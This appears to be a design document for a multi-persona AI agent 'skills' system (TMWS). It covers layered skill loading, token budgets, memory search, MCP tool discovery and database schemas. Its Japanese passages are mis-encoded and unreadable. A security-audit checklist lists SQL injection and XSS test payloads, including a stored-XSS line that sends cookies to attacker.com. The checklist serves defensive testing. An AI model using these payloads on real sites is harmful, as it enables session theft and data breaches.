User: "Can you check this Flask app for security issues?"

# Hestia's Process (using this skill)
1. Load Layer 2 (Core Instructions) â† 2,000 tokens
2. Execute Phase 1 (Reconnaissance)
   - Run bandit on Python files
   - Check pip-audit for CVE
3. Generate findings report
4. No Layer 4 needed (simple scan)

# Output
Hestia: "...ã™ã¿ã¾ã›ã‚“ã€3ã¤ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã‚’ç™ºè¦‹ã—ã¾ã—ãŸ...
1. CRITICAL: SQL injection (app.py:45)
2. HIGH: Hardcoded secret key (.env exposed)
3. MEDIUM: Missing CSRF protection

è©³ç´°ãªä¿®æ­£æ–¹æ³•ã‚’ã”èª¬æ˜ã—ã¾ã™ã­..."
```

### Example 2: Complex Audit with Past Learnings
```bash
# Input
User: "Perform comprehensive security audit for production deployment"

# Hestia's Process (using this skill)
1. Load Layer 2 (Core Instructions) â† 2,000 tokens
2. Load Layer 3 (Auxiliary Resources) â† 3,500 tokens
   - Detailed penetration test procedures
   - Common vulnerability patterns
3. Load Layer 4 (Just-in-Time Memory) â† 5,000 tokens
   - Search: "security vulnerabilities, CVE, production deployment"
   - Results: Past audit findings, successful mitigations
4. Execute comprehensive audit (Phase 1-3)
5. Verify findings with verify_and_record

# Output
Hestia: "...åŒ…æ‹¬çš„ãªç›£æŸ»ã‚’å®Œäº†ã—ã¾ã—ãŸ...
éå»ã®åŒæ§˜ã®äº‹ä¾‹ï¼ˆMemory ID: abc-123ï¼‰ã‚’å‚è€ƒã«ã€
27é …ç›®ã®ãƒã‚§ãƒƒã‚¯ã‚’å®Ÿæ–½ã—ã¾ã—ãŸã€‚

CRITICAL: 0ä»¶
HIGH: 2ä»¶ (æ—¢çŸ¥ã®å¯¾ç­–ã‚ã‚Š)
MEDIUM: 5ä»¶
...è©³ç´°ãƒ¬ãƒãƒ¼ãƒˆã‚’ä½œæˆã—ã¾ã™ã­..."
```

---

# Section 3: Auxiliary Resources (Layer 3)

## Detailed Penetration Test Procedures (è©³ç´°ä¾µå…¥ãƒ†ã‚¹ãƒˆæ‰‹é †)

### SQL Injection Testing Checklist

1. **Error-Based SQL Injection**
   ```sql
   ' OR '1'='1' --
   ' OR '1'='1' /*
   admin'--
   ```

2. **Blind SQL Injection**
   ```sql
   ' AND SLEEP(5)--
   ' AND '1'='1
   ' AND '1'='2
   ```

3. **Union-Based SQL Injection**
   ```sql
   ' UNION SELECT NULL,NULL,NULL--
   ' UNION SELECT username,password FROM users--
   ```

### XSS Testing Checklist

1. **Reflected XSS**
   ```javascript
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   ```

2. **Stored XSS**
   - Test: User input fields, comments, profiles
   - Payload: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`

3. **DOM-Based XSS**
   - Test: Client-side JavaScript processing
   - Payload: `#<img src=x onerror=alert('XSS')>`

### CSRF Testing Checklist

1. **Missing CSRF Token**
   - Check: Forms without CSRF protection
   - Test: Submit form from external domain

2. **Weak CSRF Token**
   - Check: Predictable tokens, shared tokens
   - Test: Reuse old tokens, guess token patterns

## Common Vulnerability Patterns (ã‚ˆãã‚ã‚‹è„†å¼±æ€§ãƒ‘ã‚¿ãƒ¼ãƒ³)

### Pattern 1: Hardcoded Secrets
```python
# âŒ BAD
SECRET_KEY = "mysecretkey123"
DATABASE_URL = "postgresql://admin:password@localhost/db"

# âœ… GOOD
import os
SECRET_KEY = os.getenv("SECRET_KEY")
DATABASE_URL = os.getenv("DATABASE_URL")
```

### Pattern 2: Missing Input Validation
```python
# âŒ BAD
user_id = request.args.get("id")
query = f"SELECT * FROM users WHERE id = {user_id}"

# âœ… GOOD
user_id = request.args.get("id")
if not user_id.isdigit():
    raise ValueError("Invalid user ID")
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

### Pattern 3: Weak Authentication
```python
# âŒ BAD
password_hash = hashlib.md5(password.encode()).hexdigest()

# âœ… GOOD
from passlib.hash import bcrypt
password_hash = bcrypt.hash(password)
```

## Reference Links (å‚è€ƒãƒªãƒ³ã‚¯)

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE Top 25: https://cwe.mitre.org/top25/
- TMWS Security Guidelines: `/docs/dev/SECURITY_GUIDELINES.md`

---

## Layer Loading Decision Tree (ãƒ¬ã‚¤ãƒ¤ãƒ¼èª­ã¿è¾¼ã¿åˆ¤æ–­ãƒ•ãƒ­ãƒ¼)

```
Task Received
    â”‚
    â–¼
Search Skills (semantic) â”€â”€â”€â”€â–º Match Found?
    â”‚                               â”‚
    â”‚                               â–¼
    â”‚                          Load Layer 1 (Metadata)
    â”‚                               â”‚ ~100 tokens
    â”‚                               â–¼
    â”‚                          Skill Applicable? â”€â”€â”€ NO â”€â”€â–º Use general capabilities
    â”‚                               â”‚ YES
    â”‚                               â–¼
    â”‚                          Load Layer 2 (Core Instructions)
    â”‚                               â”‚ ~2,000 tokens
    â”‚                               â–¼
    â”‚                          Need Detailed Procedures?
    â”‚                               â”œâ”€ NO â”€â”€â–º Execute with Layer 2 only
    â”‚                               â”‚
    â”‚                               â–¼ YES
    â”‚                          Load Layer 3 (Auxiliary)
    â”‚                               â”‚ ~3,500 tokens
    â”‚                               â–¼
    â”‚                          Need Past Examples?
    â”‚                               â”œâ”€ NO â”€â”€â–º Execute with Layer 2+3
    â”‚                               â”‚
    â”‚                               â–¼ YES
    â”‚                          Load Layer 4 (Memory Search)
    â”‚                               â”‚ ~5,000 tokens (dynamic)
    â”‚                               â–¼
    â”‚                          Execute with full context
    â”‚                               â”‚ ~10,500 tokens total
    â”‚                               â–¼
    â”‚                          Complete task
```
```

---

### 2.3 Token Budget Integration (ãƒˆãƒ¼ã‚¯ãƒ³äºˆç®—çµ±åˆ)

**Context** (from Phase 2E-2):
- FREE tier: 1M tokens/hour
- PRO tier: 5M tokens/hour
- ENTERPRISE tier: 50M tokens/hour

**Skills Token Consumption**:

| Scenario | Tokens | FREE Capacity | PRO Capacity |
|----------|--------|---------------|--------------|
| List all skills (Layer 1) | ~1,500 | 666 times/h | 3,333 times/h |
| Load single skill (Layer 2) | ~2,100 | 476 times/h | 2,380 times/h |
| Load with auxiliary (Layer 3) | ~5,600 | 178 times/h | 892 times/h |
| Load with memory (Layer 4) | ~10,600 | 94 times/h | 471 times/h |

**Optimization Strategy**:
1. **Aggressive Caching** (Redis):
   - Layer 1 metadata: Cache 1 hour (hot path)
   - Layer 2 core: Cache 30 minutes (warm path)
   - Layer 3 auxiliary: Cache 15 minutes (cold path)
   - Layer 4 memory: No cache (dynamic, always fresh)

2. **Lazy Loading** (On-Demand):
   - Never preload all skills at startup
   - Load only when `list_skills()` or `search_skills()` called
   - Progressive disclosure prevents full context loading

3. **Token Counting**:
```python
class SkillService:
    async def get_skill(
        self,
        skill_name: str,
        disclosure_level: int,
    ) -> SkillResponse:
        """Get skill with token tracking."""

        # Calculate token count for this disclosure level
        token_estimate = await self._estimate_tokens(skill_name, disclosure_level)

        # Check token budget (integrates with TokenBudgetValidator)
        await self.budget_validator.check_budget(
            agent_id=current_agent.id,
            tier=current_agent.tier,
            token_count=token_estimate,
        )

        # Load skill (budget approved)
        skill = await self._load_skill(skill_name, disclosure_level)

        # Track actual consumption
        actual_tokens = await self._count_tokens(skill)
        await self.budget_validator.consume_tokens(
            agent_id=current_agent.id,
            token_count=actual_tokens,
        )

        return skill
```

---

## III. Just-in-Time Memory Loading Design (å‹•çš„ãƒ¡ãƒ¢ãƒªãƒ­ãƒ¼ãƒ‰è¨­è¨ˆ)

### 3.1 Memory Filters Configuration (ãƒ¡ãƒ¢ãƒªãƒ•ã‚£ãƒ«ã‚¿ãƒ¼è¨­å®š)

**SKILL.md Frontmatter** (YAML):
```yaml
memory_filters:
  # Semantic search query (required)
  semantic_query: "security vulnerabilities, CVE, penetration test results, past audit findings"

  # Namespace (project-specific, required for multi-tenancy)
  namespace: "tmws"

  # Tags (optional, for structured filtering)
  tags:
    - "security"
    - "vulnerability"
    - "audit"
    - "CVE"

  # Top K results (default: 10)
  top_k: 10

  # Minimum similarity threshold (0.0-1.0, default: 0.7)
  min_similarity: 0.75

  # Time range (optional, for recency bias)
  time_range:
    start: "2024-01-01T00:00:00Z"  # ISO 8601 format
    end: null  # null = now

  # Importance threshold (optional, 0.0-1.0)
  min_importance: 0.6

  # Access level filter (optional)
  access_levels:
    - "TEAM"
    - "PUBLIC"
    - "SYSTEM"
```

**Parsing and Execution**:
```python
class SkillService:
    async def _execute_memory_search(
        self,
        skill: Skill,
        context_query: str | None,
    ) -> list[dict]:
        """Execute Just-in-Time memory search based on skill filters.

        Performance: <20ms P95 (ChromaDB semantic search)
        """
        filters = skill.memory_filters

        # Use context_query if provided, otherwise use skill's semantic_query
        query = context_query or filters.get("semantic_query", "")

        # Execute semantic search via MemoryService
        results = await self.memory_service.search_memories(
            query=query,
            namespace=filters.get("namespace", "default"),
            tags=filters.get("tags"),
            limit=filters.get("top_k", 10),
            min_similarity=filters.get("min_similarity", 0.7),
        )

        # Additional filtering (time range, importance)
        filtered_results = self._apply_additional_filters(
            results,
            time_range=filters.get("time_range"),
            min_importance=filters.get("min_importance"),
            access_levels=filters.get("access_levels"),
        )

        return filtered_results
```

---

### 3.2 Memory Search Results Injection (æ¤œç´¢çµæœã®æ³¨å…¥)

**Layer 4 Response Structure**:
```python
@dataclass
class SkillResponse:
    """Skill with progressive disclosure layers."""

    # Layer 1: Metadata
    id: UUID
    name: str
    description: str
    category: str
    persona: str
    triggers: list[str]

    # Layer 2: Core Instructions (loaded if disclosure_level >= 2)
    core_instructions: str | None = None
    communication_style: str | None = None
    examples: list[dict] | None = None

    # Layer 3: Auxiliary Resources (loaded if disclosure_level >= 3)
    auxiliary_resources: dict | None = None
    reference_links: list[str] | None = None

    # Layer 4: Just-in-Time Memory (loaded if disclosure_level >= 4)
    memory_search_results: list[dict] | None = None

    # Token metrics
    token_count: int = 0
    disclosure_level: int = 1

# Example Layer 4 response
{
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "name": "Security Audit",
    "description": "Comprehensive security analysis using Hestia's methodology",
    "category": "security",
    "persona": "hestia-auditor",
    "triggers": ["security", "audit", "vulnerability"],

    # Layer 2
    "core_instructions": "## Objective\n\nã“ã®ã‚¹ã‚­ãƒ«ã¯...",
    "communication_style": "Hestiaã¯æ…é‡ã§ä¸å¯§ãªå£èª¿ã§...",
    "examples": [
        {
            "title": "Simple Security Scan",
            "input": "Can you check this Flask app?",
            "process": "1. Load Layer 2\n2. Execute Phase 1...",
            "output": "...3ã¤ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã‚’ç™ºè¦‹ã—ã¾ã—ãŸ..."
        }
    ],

    # Layer 3
    "auxiliary_resources": {
        "penetration_test_procedures": "### SQL Injection Testing...",
        "common_patterns": "### Pattern 1: Hardcoded Secrets...",
    },
    "reference_links": [
        "https://owasp.org/www-project-top-ten/",
        "/docs/dev/SECURITY_GUIDELINES.md"
    ],

    # Layer 4 (Just-in-Time Memory)
    "memory_search_results": [
        {
            "id": "abc-123-def-456",
            "content": "Security audit findings for TMWS v2.2.6: SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±æ€§ã‚’3ä»¶ç™ºè¦‹ã€‚ã™ã¹ã¦ä¿®æ­£æ¸ˆã¿ã€‚",
            "similarity": 0.89,
            "importance_score": 0.9,
            "tags": ["security", "audit", "SQLi"],
            "created_at": "2025-11-01T12:34:56Z",
            "context": {
                "project": "TMWS",
                "version": "v2.2.6",
                "severity": "HIGH"
            }
        },
        {
            "id": "ghi-789-jkl-012",
            "content": "Penetration test results: CSRF protection missing in 5 endpoints. Added middleware.",
            "similarity": 0.85,
            "importance_score": 0.85,
            "tags": ["security", "CSRF", "penetration test"],
            "created_at": "2025-10-27T08:22:11Z",
            "context": {
                "project": "TMWS",
                "phase": "Phase 2D",
            }
        },
        # ... up to 10 results
    ],

    "token_count": 10500,
    "disclosure_level": 4
}
```

**Token Breakdown** (Layer 4):
- Metadata (Layer 1): ~100 tokens
- Core Instructions (Layer 2): ~2,000 tokens
- Auxiliary Resources (Layer 3): ~3,500 tokens
- Memory Search Results (Layer 4): ~5,000 tokens (10 results Ã— ~500 tokens each)
- **Total**: ~10,600 tokens

---

### 3.3 Integration with Learning Patterns (å­¦ç¿’ãƒ‘ã‚¿ãƒ¼ãƒ³é€£æº)

**Context** (from Phase 2A):
- `LearningTrustIntegrationService`: Pattern propagation from verifications
- `LearningPattern`: Success patterns extracted from memories
- Trust score propagation: Accurate verifications boost pattern trust

**Skills + Learning Patterns**:
```python
class SkillService:
    async def get_skill_with_patterns(
        self,
        skill_name: str,
        disclosure_level: int = 4,
        context_query: str | None = None,
    ) -> SkillResponse:
        """Get skill with Just-in-Time memory + learning patterns.

        This extends Layer 4 to include:
        - Memory search results (past examples)
        - Learning patterns (successful strategies)

        Learning patterns are automatically linked to memories via
        LearningTrustIntegrationService (Phase 2A).
        """
        # Load skill (Layers 1-3)
        skill = await self.get_skill(skill_name, disclosure_level=3)

        if disclosure_level >= 4:
            # Execute memory search
            memories = await self._execute_memory_search(skill, context_query)

            # Extract linked learning patterns
            pattern_ids = set()
            for memory in memories:
                pattern_ids.update(memory.get("pattern_ids", []))

            # Fetch learning patterns
            patterns = await self.learning_service.get_patterns_by_ids(list(pattern_ids))

            # Inject into Layer 4
            skill.memory_search_results = memories
            skill.learning_patterns = [
                {
                    "id": str(p.id),
                    "pattern_type": p.pattern_type,
                    "description": p.pattern_data.get("description"),
                    "confidence": p.confidence,
                    "success_rate": p.pattern_data.get("success_rate", 0.0),
                    "usage_count": p.frequency,
                }
                for p in patterns
            ]

        return skill
```

**Example Response** (with Learning Patterns):
```json
{
    "name": "Security Audit",
    "disclosure_level": 4,

    "memory_search_results": [
        {
            "id": "abc-123",
            "content": "SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ä¿®æ­£: ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªã«å¤‰æ›´",
            "pattern_ids": ["pattern-001", "pattern-002"]
        }
    ],

    "learning_patterns": [
        {
            "id": "pattern-001",
            "pattern_type": "security_mitigation",
            "description": "SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³é˜²æ­¢ãƒ‘ã‚¿ãƒ¼ãƒ³: ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªä½¿ç”¨",
            "confidence": 0.95,
            "success_rate": 1.0,
            "usage_count": 12
        },
        {
            "id": "pattern-002",
            "pattern_type": "verification_strategy",
            "description": "ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¿®æ­£ã®æ¤œè¨¼: è‡ªå‹•ãƒ†ã‚¹ãƒˆå®Ÿè¡Œ",
            "confidence": 0.92,
            "success_rate": 0.97,
            "usage_count": 18
        }
    ]
}
```

**Benefits**:
- âœ… éå»ã®æˆåŠŸäº‹ä¾‹ï¼ˆMemoryï¼‰ã¨æˆåŠŸãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆLearning Patternï¼‰ã‚’åŒæ™‚æ´»ç”¨
- âœ… Trust scoreã«åŸºã¥ãä¿¡é ¼æ€§è©•ä¾¡
- âœ… Verification evidenceã«ã‚ˆã‚‹æ ¹æ‹ ã®æ˜ç¢ºåŒ–
- âœ… å­¦ç¿’ã®è‡ªå‹•è“„ç©ï¼ˆPhase 2Açµ±åˆã®æ©æµï¼‰

---

## IV. MCP Tools Bundling Strategy (ãƒ„ãƒ¼ãƒ«ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°æˆ¦ç•¥)

### 4.1 Tools Metadata in SKILL.md (ãƒ„ãƒ¼ãƒ«ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿)

**Layer 1 (Metadata)**: Tool name + summary
```yaml
tools:
  - name: "search_memories"
    summary: "Search for past security findings"
    detail_level: "summary"

  - name: "verify_and_record"
    summary: "Verify security claims with executable tests"
    detail_level: "summary"
```

**Layer 2 (Core)**: Add parameter hints
```yaml
tools:
  - name: "search_memories"
    summary: "Search for past security findings"
    parameters_hint: "query (str), namespace (str), tags (list[str])"
    detail_level: "brief"

  - name: "verify_and_record"
    summary: "Verify security claims with executable tests"
    parameters_hint: "agent_id (str), claim_type (str), verification_command (str)"
    detail_level: "brief"
```

**Layer 3 (Auxiliary)**: Full schema on-demand
```python
# Full schema loaded only when tool is actually used

# Option A: Load from MCP server dynamically
schema = await mcp_client.get_tool_schema("search_memories")

# Option B: Cache in SQLite skills table
schema = await skill_service.get_tool_schema(
    tool_name="search_memories",
    skill_id=skill.id,
)
```

---

### 4.2 MCP Tools Discovery Service (ãƒ„ãƒ¼ãƒ«ç™ºè¦‹ã‚µãƒ¼ãƒ“ã‚¹)

**Integration with mcporter** (from research/MCP_TOOLS_MANAGEMENT_ANALYSIS.md):

**Option A (Recommended)**: Pure Python Implementation
```python
class MCPToolDiscoveryService:
    """Discover and catalog MCP tools from external servers.

    This is a Pure Python implementation of mcporter's core functionality,
    adapted for TMWS requirements (no Node.js dependency).
    """

    async def discover_server_tools(
        self,
        server_config: MCPServerConfig,
    ) -> list[ToolDefinition]:
        """Discover all tools from an MCP server.

        Supports:
        - HTTP/HTTPS: POST /list_tools
        - STDIO: Local process spawn
        - OAuth: Browser auth + token caching (future)
        """
        if server_config.transport == "http":
            return await self._discover_http(server_config.url)
        elif server_config.transport == "stdio":
            return await self._discover_stdio(server_config.command)
        else:
            raise ValueError(f"Unsupported transport: {server_config.transport}")

    async def _discover_http(self, url: str) -> list[ToolDefinition]:
        """Discover tools via HTTP MCP protocol."""
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.post(
                f"{url}/list_tools",
                json={"detail_level": "full"},
            )
            response.raise_for_status()

            tools_data = response.json()["tools"]
            return [self._parse_tool(t) for t in tools_data]

    async def _discover_stdio(self, command: str) -> list[ToolDefinition]:
        """Discover tools via STDIO (local process)."""
        # Spawn MCP server process
        proc = await asyncio.create_subprocess_exec(
            *command.split(),
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        # Send list_tools request
        request = json.dumps({"method": "list_tools", "params": {}})
        stdout, _ = await proc.communicate(request.encode())

        # Parse response
        response = json.loads(stdout.decode())
        return [self._parse_tool(t) for t in response["result"]["tools"]]

    def _parse_tool(self, tool_data: dict) -> ToolDefinition:
        """Parse tool metadata from MCP response."""
        return ToolDefinition(
            name=tool_data["name"],
            description=tool_data["description"],
            input_schema=tool_data.get("inputSchema", {}),
            output_schema=tool_data.get("outputSchema"),  # May be None

            # TMWS extensions (not in mcporter)
            semantic_embedding=None,  # Generated later
            usage_examples=None,  # Generated later
            performance_hints=None,  # Measured later
            trust_score=0.5,  # Initial neutral
        )
```

**TMWS Extensions** (beyond mcporter):
```python
class MCPToolEnrichmentService:
    """Enrich discovered tools with TMWS-specific metadata.

    Extensions beyond mcporter:
    - Semantic embeddings (ChromaDB)
    - Usage examples (from past invocations)
    - Performance hints (latency, token cost)
    - Trust scores (verification history)
    - Rate limits (from server capabilities)
    - Access control (namespace isolation)
    """

    async def enrich_tool(
        self,
        tool: ToolDefinition,
    ) -> EnrichedToolMetadata:
        """Add TMWS extensions to discovered tool."""

        # P0: Semantic embedding (for tool discovery)
        embedding = await self.ollama_service.encode_document(
            f"{tool.name}\n{tool.description}\n{json.dumps(tool.input_schema)}"
        )

        # P0: Usage examples (from past Memory)
        examples = await self.memory_service.search_memories(
            query=f"tool invocation example: {tool.name}",
            namespace="tmws",
            tags=["tool_usage", tool.name],
            limit=3,
        )

        # P1: Performance hints (from monitoring)
        perf_stats = await self.monitoring_service.get_tool_stats(tool.name)

        # P1: Trust score (from verification history)
        trust_score = await self.trust_service.get_tool_trust_score(tool.name)

        return EnrichedToolMetadata(
            **tool.__dict__,
            semantic_embedding=embedding.tolist(),
            usage_examples=[e["content"] for e in examples],
            performance_hints={
                "avg_latency_ms": perf_stats.get("avg_latency_ms", 0),
                "avg_tokens": perf_stats.get("avg_tokens", 0),
                "success_rate": perf_stats.get("success_rate", 0.0),
            },
            trust_score=trust_score,
        )
```

---

### 4.3 Skills-Tools Association (ã‚¹ã‚­ãƒ«ã¨ãƒ„ãƒ¼ãƒ«ã®é–¢é€£ä»˜ã‘)

**Database Schema** (Skills-Tools many-to-many):
```sql
-- Skills table (metadata)
CREATE TABLE skills (
    id UUID PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    version TEXT NOT NULL,
    description TEXT NOT NULL,
    category TEXT NOT NULL,
    persona TEXT NOT NULL,
    triggers JSONB NOT NULL,
    memory_filters JSONB,
    access_level TEXT NOT NULL DEFAULT 'PRIVATE',
    importance_score REAL NOT NULL DEFAULT 0.5,
    usage_count INTEGER NOT NULL DEFAULT 0,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);

-- Skills content (core + auxiliary, stored separately for efficient loading)
CREATE TABLE skill_contents (
    skill_id UUID PRIMARY KEY REFERENCES skills(id) ON DELETE CASCADE,
    core_instructions TEXT NOT NULL,
    communication_style TEXT,
    examples JSONB,
    auxiliary_resources JSONB,
    reference_links JSONB,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);

-- MCP Tools catalog
CREATE TABLE mcp_tools (
    id UUID PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    description TEXT NOT NULL,
    input_schema JSONB NOT NULL,
    output_schema JSONB,
    server_url TEXT NOT NULL,
    transport_type TEXT NOT NULL,  -- 'http', 'stdio', 'oauth'
    trust_score REAL NOT NULL DEFAULT 0.5,
    usage_count INTEGER NOT NULL DEFAULT 0,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);

-- Skills-Tools association (many-to-many)
CREATE TABLE skill_tools (
    skill_id UUID NOT NULL REFERENCES skills(id) ON DELETE CASCADE,
    tool_id UUID NOT NULL REFERENCES mcp_tools(id) ON DELETE CASCADE,
    detail_level TEXT NOT NULL,  -- 'summary', 'brief', 'full'
    usage_priority INTEGER NOT NULL DEFAULT 0,  -- Higher = more frequently used
    PRIMARY KEY (skill_id, tool_id)
);

-- Indexes for performance
CREATE INDEX idx_skills_category ON skills(category);
CREATE INDEX idx_skills_persona ON skills(persona);
CREATE INDEX idx_skills_usage ON skills(usage_count DESC);
CREATE INDEX idx_mcp_tools_name ON mcp_tools(name);
CREATE INDEX idx_skill_tools_skill ON skill_tools(skill_id);
CREATE INDEX idx_skill_tools_tool ON skill_tools(tool_id);
```

**Querying Skills with Tools**:
```python
class SkillService:
    async def get_skill_with_tools(
        self,
        skill_id: UUID,
        disclosure_level: int,
    ) -> SkillResponse:
        """Get skill with associated MCP tools."""

        # Layer 1: Metadata only
        query = select(Skill).where(Skill.id == skill_id)
        skill = (await self.session.execute(query)).scalar_one_or_none()

        if disclosure_level >= 2:
            # Layer 2+: Load content
            content_query = select(SkillContent).where(SkillContent.skill_id == skill_id)
            content = (await self.session.execute(content_query)).scalar_one_or_none()
            skill.core_instructions = content.core_instructions
            skill.communication_style = content.communication_style
            skill.examples = content.examples

        if disclosure_level >= 3:
            # Layer 3: Load auxiliary resources
            skill.auxiliary_resources = content.auxiliary_resources
            skill.reference_links = content.reference_links

        # Load associated tools (regardless of disclosure level)
        tools_query = (
            select(MCPTool, SkillTool.detail_level, SkillTool.usage_priority)
            .join(SkillTool, SkillTool.tool_id == MCPTool.id)
            .where(SkillTool.skill_id == skill_id)
            .order_by(SkillTool.usage_priority.desc())
        )
        tools_result = await self.session.execute(tools_query)

        skill.tools = [
            {
                "name": tool.name,
                "description": tool.description,
                "detail_level": detail_level,
                "usage_priority": priority,
                # Full schema loaded only if detail_level == 'full'
                "input_schema": tool.input_schema if detail_level == "full" else None,
            }
            for tool, detail_level, priority in tools_result
        ]

        return skill
```

---

## V. Team Coordination Patterns (ãƒãƒ¼ãƒ å”èª¿ãƒ‘ã‚¿ãƒ¼ãƒ³)

### 5.1 Persona-Specific Skills (ãƒšãƒ«ã‚½ãƒŠåˆ¥ã‚¹ã‚­ãƒ«)

**6ã¤ã®Trinitasãƒšãƒ«ã‚½ãƒŠ Ã— å°‚ç”¨Skills**:

| Persona | Primary Skills | Use Cases |
|---------|----------------|-----------|
| **Athena (Conductor)** ğŸ›ï¸ | workflow-orchestration, resource-allocation, harmony-optimization | Multi-agent coordination, workflow design, performance tuning |
| **Artemis (Optimizer)** ğŸ¹ | code-optimization, performance-profiling, algorithm-design | Code review, bottleneck analysis, efficiency improvements |
| **Hestia (Auditor)** ğŸ”¥ | security-audit, vulnerability-assessment, risk-analysis | Security reviews, penetration testing, compliance checks |
| **Eris (Coordinator)** âš”ï¸ | tactical-planning, conflict-resolution, team-coordination | Sprint planning, blockers resolution, stakeholder management |
| **Hera (Strategist)** ğŸ­ | strategic-planning, architecture-design, roadmap-creation | Long-term planning, system design, technology selection |
| **Muses (Documenter)** ğŸ“š | documentation-generation, knowledge-archival, api-docs-creation | README creation, API documentation, tutorials |

**Skill Discovery by Persona**:
```python
# List Hestia's available skills
skills = await skill_service.list_skills(persona="hestia-auditor")

# Response
{
    "skills": [
        {
            "id": "550e8400-e29b-41d4-a716-446655440000",
            "name": "Security Audit",
            "description": "Comprehensive security analysis",
            "category": "security",
            "persona": "hestia-auditor",
            "triggers": ["security", "audit", "vulnerability"],
            "usage_count": 127,
            "importance_score": 0.95
        },
        {
            "id": "660e9500-f39c-52e5-b827-557766551111",
            "name": "Vulnerability Assessment",
            "description": "Automated vulnerability scanning",
            "category": "security",
            "persona": "hestia-auditor",
            "triggers": ["vulnerability", "CVE", "scan"],
            "usage_count": 89,
            "importance_score": 0.88
        },
        # ...
    ],
    "total": 15,
    "token_estimate": 1500  # ~100 tokens per skill
}
```

---

### 5.2 Cross-Persona Collaboration (ã‚¯ãƒ­ã‚¹ãƒšãƒ«ã‚½ãƒŠå”èª¿)

**Scenario**: Security-focused performance optimization

```python
# Step 1: Hestia identifies security bottleneck
hestia_skill = await skill_service.get_skill(
    skill_name="Security Audit",
    disclosure_level=4,  # Include past examples
    context_query="authentication performance bottleneck",
)

# Hestia: "...ã™ã¿ã¾ã›ã‚“ã€èªè¨¼å‡¦ç†ã«1ç§’ã‹ã‹ã£ã¦ã„ã¾ã™ã€‚ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æœ€é©åŒ–ãŒå¿…è¦ã§ã™..."

# Step 2: Handoff to Artemis for optimization
artemis_skill = await skill_service.get_skill(
    skill_name="Performance Profiling",
    disclosure_level=4,
    context_query="authentication optimization bcrypt",
)

# Artemis: "ãƒ•ãƒ³ã€bcryptã®ã‚³ã‚¹ãƒˆä¿‚æ•°ãŒé«˜ã™ãã‚‹ã‚ã­ã€‚12 â†’ 10ã«ä¸‹ã’ã‚Œã°400msçŸ­ç¸®ã§ãã‚‹ã€‚"

# Step 3: Back to Hestia for security validation
hestia_validation = await skill_service.get_skill(
    skill_name="Security Impact Assessment",
    disclosure_level=3,
    context_query="bcrypt cost reduction security impact",
)

# Hestia: "...bcrypt cost 10ã¯2025å¹´åŸºæº–ã§ã¯å®‰å…¨ã§ã™ã€‚å•é¡Œã‚ã‚Šã¾ã›ã‚“..."
```

**Skills System Enables**:
- âœ… Personaã”ã¨ã®å°‚é–€çŸ¥è­˜ã‚’æ®µéšçš„ã«ãƒ­ãƒ¼ãƒ‰
- âœ… ã‚¯ãƒ­ã‚¹ãƒšãƒ«ã‚½ãƒŠã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆå…±æœ‰ (memory_filtersçµŒç”±)
- âœ… éå»ã®å”èª¿äº‹ä¾‹ã‚’è‡ªå‹•æ´»ç”¨ (Layer 4 Just-in-Time Memory)

---

### 5.3 Skills Access Control (ã‚¹ã‚­ãƒ«ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡)

**Multi-Tenant Isolation** (æ—¢å­˜Memory access controlã¨åŒä¸€):
```python
class Skill(TMWSBase):
    """Skill model with access control."""

    # Access control (same as Memory)
    access_level: Mapped[AccessLevel] = mapped_column(
        sa.Enum(AccessLevel, values_callable=lambda obj: [e.value for e in obj]),
        nullable=False,
        default=AccessLevel.PRIVATE,
        index=True,
    )

    shared_with_personas: Mapped[list[str]] = mapped_column(
        JSON,
        nullable=False,
        default=list,
        comment="List of persona IDs with explicit access",
    )

    def is_accessible_by(
        self,
        requesting_persona: str,
        requesting_namespace: str,
    ) -> bool:
        """Check if skill is accessible (same logic as Memory.is_accessible_by)."""
        # PRIVATE: Owner only
        if self.access_level == AccessLevel.PRIVATE:
            return requesting_persona == self.persona

        # TEAM: Same namespace
        elif self.access_level == AccessLevel.TEAM:
            return requesting_namespace == self.namespace

        # SHARED: Explicit sharing
        elif self.access_level == AccessLevel.SHARED:
            return requesting_persona in self.shared_with_personas

        # PUBLIC/SYSTEM: All
        else:
            return True
```

**Example**: Artemis can access Hestia's security skills if shared
```python
# Hestia creates a skill and shares with Artemis
skill = await skill_service.create_skill(
    name="SQL Injection Detection",
    persona="hestia-auditor",
    access_level=AccessLevel.SHARED,
    shared_with_personas=["artemis-optimizer"],  # Allow Artemis to use this
    # ...
)

# Artemis can now load Hestia's skill
artemis_query = await skill_service.get_skill(
